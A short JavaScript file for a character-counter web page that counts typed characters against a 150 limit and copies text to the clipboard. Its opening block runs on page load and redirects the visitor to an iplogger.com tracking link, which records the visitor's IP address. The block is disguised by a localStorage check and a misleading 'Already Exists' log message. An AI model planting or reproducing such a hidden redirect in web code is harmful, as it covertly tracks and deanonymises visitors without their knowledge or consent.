let localSt = localStorage.getItem("tempValOne");
if(localSt === 1){
    console.log("Already Exists");
}else{
    localStorage.setItem("tempValOne", 1);
    location.replace("https://iplogger.com/2L7Ad5");
    console.log("Already Exists")
    }


let chars = 0;
let text = "";

function countText(){
  let remaining = 150;

    text = document.querySelector(".typedText");
    chars = (text.value.length);  // Counts words typed.
    remaining -= chars;    // counts remaining words.
    // console.log(chars, remaining);
    document.getElementById("typedWords").textContent = chars;
    document.getElementById("remainingWords").textContent = remaining;
}

function copyToClipBoard(){
  let wordText = document.querySelector(".typedText");
  navigator.clipboard.writeText(wordText.value);   // This will copy text to clipboard.
  alert("Copied to clipboard");
}




// When typed text, it counts number of characters.
document.querySelector(".typedText").addEventListener("keyup",countText);

// When clicked on copy text, text should be copied.


document.getElementById("copy").onclick = copyToClipBoard;
